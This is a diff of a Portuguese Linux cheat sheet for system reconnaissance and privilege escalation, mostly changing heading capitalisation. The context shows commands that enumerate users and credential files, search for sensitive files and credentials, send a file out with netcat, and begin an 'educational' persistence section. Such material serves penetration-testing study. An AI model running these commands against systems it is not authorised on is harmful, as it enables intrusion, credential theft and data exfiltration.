@@ -1,4 +1,7 @@
-## **COMANDOS DE RECONHECIMENTO DO SISTEMA**
+## **O que é Shell?
+Um shell é um programa de interface de linha de comando que permite interagir com o sistema operacional Linux.
+
+## **Comandos de reconhecimento do sistema**
 
 ```bash
 # Informações do usuário
@@ -20,7 +23,7 @@ arch                      # Arquitetura do processador
 pwd                       # Diretório de trabalho atual
 ```
 
-## **INFORMAÇÕES DE USUÁRIOS E GRUPOS**
+## **Informações de usuários e grupos**
 
 ```bash
 cat /etc/passwd           # Lista todos os usuários
@@ -31,7 +34,7 @@ last                      # Histórico de logins
 lastlog                   # Último login de cada usuário
 ```
 
-## **PRIVILÉGIOS E PERMISSÕES**
+## **Privilégios e permissões**
 
 ```bash
 # Sudo
@@ -49,7 +52,7 @@ ls -la /etc/shadow
 ls -la /etc/sudoers
 ```
 
-## **PROCESSOS E SERVIÇOS**
+## **Processos e serviços**
 
 ```bash
 ps aux                    # Todos os processos
@@ -65,7 +68,7 @@ service --status-all      # Status serviços (SysV)
 chkconfig --list          # Serviços configurados (Red Hat)
 ```
 
-## **REDE E CONEXÕES**
+## **Rede e conexões**
 
 ```bash
 ifconfig                  # Interfaces de rede
@@ -77,7 +80,7 @@ route -n                  # Tabela de roteamento
 arp -a                    # Tabela ARP
 ```
 
-## **INFORMAÇÕES DO SISTEMA**
+## **Informações do sistema**
 
 ```bash
 # Hardware
@@ -95,7 +98,7 @@ echo $HOME                # Diretório home
 set                       # Variáveis shell
 ```
 
-## **BUSCA DE ARQUIVOS SENSÍVEIS**
+## **Busca de arquivos sensíveis**
 
 ```bash
 # Arquivos de configuração
@@ -111,7 +114,7 @@ find / -readable -type f 2>/dev/null         # Arquivos legíveis
 find / -perm -o=w -type d 2>/dev/null        # Diretórios graváveis por outros
 ```
 
-## **HISTÓRICO E LOGS**
+## **Histórico e logs**
 
 ```bash
 history                    # Histórico de comandos
@@ -122,7 +125,7 @@ dmesg                      # Mensagens do kernel
 journalctl                 # Logs do systemd
 ```
 
-## **CRON JOBS E AGENDAMENTOS**
+## **Cron jobs e agendamentos**
 
 ```bash
 crontab -l                 # Cron jobs do usuário atual
@@ -132,7 +135,7 @@ ls -la /etc/cron.d/*       # Jobs de cron adicionais
 systemctl list-timers      # Timers do systemd
 ```
 
-## **INFORMAÇÕES DE SEGURANÇA**
+## **Informações de segurança**
 
 ```bash
 getenforce                 # Status SELinux (Red Hat)
@@ -142,7 +145,7 @@ iptables -L                # Regras iptables
 ufw status                 # Status UFW
 ```
 
-## **COMANDOS ÚTEIS PARA ESCALAÇÃO**
+## **Comandos úteis para escalação**
 
 ```bash
 # Busca por credenciais
@@ -156,7 +159,7 @@ ls -la /.dockerenv        # Verifica se está em container
 systemd-detect-virt       # Detecta virtualização
 ```
 
-## **FERRAMENTAS DE TRANSFERÊNCIA DE ARQUIVOS**
+## **Ferramentas de transferência de arquivos**
 
 ```bash
 # Download
@@ -168,7 +171,7 @@ scp arquivo user@host:/path/
 nc -w 3 host port < arquivo
 ```
 
-## **COMANDOS DE PERSISTÊNCIA (PARA FINS EDUCATIVOS)**
+## **Comandos de persistência (para fins educativos)**
 
 ```bash
 # Adicionar usuário
